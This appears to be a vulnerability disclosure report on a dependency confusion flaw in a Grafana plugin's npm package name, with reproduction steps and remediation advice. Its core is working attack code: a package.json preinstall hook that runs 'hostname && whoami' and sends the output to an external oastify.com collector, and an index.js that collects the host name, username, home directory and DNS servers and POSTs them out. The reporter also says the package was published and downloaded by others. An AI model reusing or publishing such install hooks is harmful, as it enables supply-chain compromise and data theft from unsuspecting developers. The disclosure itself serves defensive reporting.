Depedency confusion vulnerability on https://github.com/grafana/metrics-drilldown/blob/main/package.json

The vulnerability has identified on Grafana owned package which was hosted under Grafana in github.
Depedency confusion vulnerability:
Dependency Confusion (also known as substitution attack or package confusion) is a type of supply chain attack where an attacker exploits discrepancies in how software dependencies are managed and resolved. This attack targets package managers and dependency resolution mechanisms used in languages like JavaScript (npm), Python (pip), Ruby (bundler), and Go (go modules).
The attacker takes advantage of the way package managers resolve dependencies by creating a malicious version of a legitimate package. This malicious package might be hosted in a public registry or repository. If the attacker can convince the package manager to use this malicious version instead of the intended one, they could execute arbitrary code, steal data, or cause other damage.
Here will provide the step-by-step guide how I can perform Remote Code Execution (RCE) from Dependency confusion vulnerability.
Steps to reproduce the attack:
1.	Visit the following url https://github.com/grafana/metrics-drilldown/blob/main/package.json
We can see the package was hosted under Grafana GitHub page
 

Step 2: In npm page we can see no one has claimed that package name.
This was the package created by me for poc with latest version 1.4.1
 

Step 3:
In kali linux using nano paste the below code as mentioned in screenshot
 

{
  "name": "grafana-metricsdrilldown-app",
  "version": "2.4.1",
  "scripts": {
    "preinstall": "node -e \"require('child_process').exec('hostname && whoami', (error, stdout, stderr) => { const data = encodeURIComponent(stdout); require('https').get('https://gdx1fsk90amm5fbhgqgjbd5r3i99x1lq.oastify.com/data-' + data, (res) => {}).on('error', (err) => {}); });\"",
    "build": "webpack -c ./webpack.config.ts --env production",
    "dev": "webpack -w -c ./webpack.config.ts --env development",
    "analyze": "webpack -c ./webpack-analyze.config.ts --env production",
    "test": "jest --watch --onlyChanged",
    "test:ci": "jest --passWithNoTests --maxWorkers 4",
    "typecheck": "tsc --noEmit",
    "lint": "eslint --cache --ignore-path ./.gitignore --ext .js,.jsx,.ts,.tsx .",
    "lint:fix": "npm run lint -- --fix && prettier --write --list-different .",
    "e2e": "playwright test",
    "e2e:fast": "playwright test --retries=2 --workers=3 -x --trace on",
    "e2e:debug": "playwright test --debug -x --trace on /test",
    "server": "docker compose up --build",
    "server:ci": "docker compose up --build -d",
    "server:down": "docker compose down",
    "sign": "npx --yes @grafana/sign-plugin@latest"
  },
  "author": "Grafana",
  "license": "Apache-2.0",
  "devDependencies": {
    "@grafana/eslint-config": "^8.0.0",
    "@grafana/plugin-e2e": "^1.17.0",
    "@grafana/tsconfig": "^2.0.0",
    "@playwright/test": "^1.41.2",
    "@stylistic/eslint-plugin-ts": "^2.9.0",
    "@swc/core": "^1.3.90",
    "@swc/helpers": "^0.5.0",
    "@swc/jest": "^0.2.26",
    "@testing-library/jest-dom": "6.1.4",
    "@testing-library/react": "14.0.0",
    "@types/jest": "^29.5.0",
    "@types/node": "^20.8.7",
    "@types/react-router-dom": "^5.2.0",
    "@types/testing-library__jest-dom": "5.14.8",
    "@typescript-eslint/eslint-plugin": "^6.18.0",
    "@typescript-eslint/parser": "^6.18.0",
    "copy-webpack-plugin": "^11.0.0",
    "css-loader": "^6.7.3",
    "dotenv": "^16.4.7",
    "eslint": "^8.0.0",
    "eslint-config-prettier": "^8.8.0",
    "eslint-import-resolver-typescript": "^3.7.0",
    "eslint-plugin-deprecation": "^2.0.0",
    "eslint-plugin-import": "^2.31.0",
    "eslint-plugin-jsdoc": "^46.8.0",
    "eslint-plugin-react": "^7.33.0",
    "eslint-plugin-react-hooks": "^4.6.0",
    "eslint-webpack-plugin": "^4.0.1",
    "fork-ts-checker-webpack-plugin": "^8.0.0",
    "glob": "^10.2.7",
    "identity-obj-proxy": "3.0.0",
    "imports-loader": "^5.0.0",
    "jest": "^29.5.0",
    "jest-environment-jsdom": "^29.5.0",
    "prettier": "^2.8.7",
    "replace-in-file-webpack-plugin": "^1.0.6",
    "sass": "1.63.2",
    "sass-loader": "13.3.1",
    "semver": "^7.6.3",
    "style-loader": "3.3.3",
    "swc-loader": "^0.2.3",
    "terser-webpack-plugin": "^5.3.10",
    "ts-node": "^10.9.2",
    "typescript": "5.5.4",
    "webpack": "^5.94.0",
    "webpack-bundle-analyzer": "^4.10.2",
    "webpack-cli": "^5.1.4",
    "webpack-livereload-plugin": "^3.0.2",
    "webpack-subresource-integrity": "^5.1.0",
    "webpack-virtual-modules": "^0.6.2"
  },
  "engines": {
    "node": ">=22"
  },
  "dependencies": {
    "@bsull/augurs": "^0.9.0",
    "@emotion/css": "11.10.6",
    "@grafana/data": "^11.5.0",
    "@grafana/lezer-logql": "^0.2.7",
    "@grafana/prometheus": "^11.6.0-223871",
    "@grafana/runtime": "^11.5.0",
    "@grafana/scenes": "^5.41.1",
    "@grafana/schema": "^11.5.0",
    "@grafana/ui": "^11.5.0",
    "@lezer/common": "^1.2.3",
    "react": "18.2.0",
    "react-dom": "18.2.0",
    "react-router-dom": "^5.2.0",
    "react-router-dom-v5-compat": "^6.29.0",
    "rxjs": "7.8.1"
  },
  "packageManager": "npm@10.5.0"
}

Step 4:
Open another file and paste the below code in index.js file
 

//author:- swaroopvenkat828@gmail.com
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const packageName = packageJSON.name;

const trackingData = JSON.stringify({
    p: packageName,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "gdx1fsk90amm5fbhgqgjbd5r3i99x1lq.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();

Step 5:
Now publish the package using npm command with latest version

 

Step 6:
Same was being reflected in the npm page as well
Step 7:
For poc I am downloading it on my system

 

Step 8:
Once the command was executed wait for some time and you can see some DNS and http in burp suite as well as the poc’s of username , ipddress and all the details mentioned in the index.js file
 


Step 9:
 Copy the message token and use url decoder in burp 

 








Step 10: Someone has already started downloading the instance.
 
For a successful attack now I am performing remote code execution (RCE) but in real time if I place my reverse shell payload I am able to get complete shell of end users.

As soon as I have published more people already downloaded the package thinking that was original.
 
We can see the there was some changes in the package just two days back.

Remediation:

1. Package Name Verification:
— Ensure that the names of all packages used in your project are known and trusted.
— Verify the source and maintainer of each package before adding it to your dependencies.
— Use tools like `npm audit` or `pip check` to detect any vulnerabilities or inconsistencies in your dependencies.
2. Package Signing:
— Utilize package signing to verify the authenticity of packages.
— For example, npm has a package signing feature that allows maintainers to sign their packages, providing a cryptographic guarantee that the package has not been modified.
3. Use Private Package Registries:
— Consider using private package registries to host your internal dependencies.
— This can help reduce the risk of attackers introducing malicious packages with similar names to your dependencies.
For References:
https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610



[Grafana Depedency confusion vulnerability.docx](https://github.com/user-attachments/files/19051766/Grafana.Depedency.confusion.vulnerability.docx)
